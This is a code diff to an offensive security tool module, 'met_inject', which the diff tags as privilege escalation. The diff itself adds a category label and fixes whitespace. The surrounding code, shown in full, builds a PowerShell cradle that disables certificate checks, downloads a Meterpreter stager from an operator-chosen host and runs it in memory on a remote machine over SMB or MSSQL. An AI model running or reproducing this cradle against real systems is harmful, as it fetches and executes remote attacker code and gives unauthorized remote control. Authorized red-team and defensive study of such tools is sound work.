@@ -1,4 +1,5 @@
 from sys import exit
+from nxc.helpers.misc import CATEGORY
 
 
 class NXCModule:
@@ -10,6 +11,7 @@ class NXCModule:
     name = "met_inject"
     description = "Downloads the Meterpreter stager and injects it into memory"
     supported_protocols = ["smb", "mssql"]
+    category = CATEGORY.PRIVILEGE_ESCALATION
 
     def __init__(self, context=None, module_options=None):
         self.rand = None
@@ -25,7 +27,7 @@ class NXCModule:
         SRVPORT     Stager port
         RAND        Random string given by metasploit (if using web_delivery)
         SSL         Stager server use https or http (default: https)
-        
+
         This module is compatable with --obfs, --force-ps32 (PowerShell execution options)
 
         multi/handler method that don't require RAND:
@@ -60,14 +62,14 @@ class NXCModule:
         proto = "http" if self.met_ssl == "http" else "https"
         metasploit_endpoint = f"{proto}://{self.srvhost}:{self.srvport}/{self.rand}"
         context.log.debug(f"{metasploit_endpoint=}")
-        
+
         # use single quotes inside because if we run this in 32bit PowerShell, the entire command is double quoted (see helpers/powershell.py:create_ps_command())
         command = f"$ProgressPreference = 'SilentlyContinue'; [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}};$client = New-Object Net.WebClient;$client.Proxy=[Net.WebRequest]::GetSystemWebProxy();$client.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;Invoke-Expression $client.downloadstring('{metasploit_endpoint}');"
         context.log.debug(f"Running command via ps_execute: {command}")
-        
+
         output = connection.ps_execute(command)
         context.log.debug(f"Received output from ps_execute: {output}")
-        
+
         if output and "Unable to connect to the remote server" in output:
             context.log.error("Executed payload, but the cradle was unable to download the stager, is the Metasploit server running?")
         else:
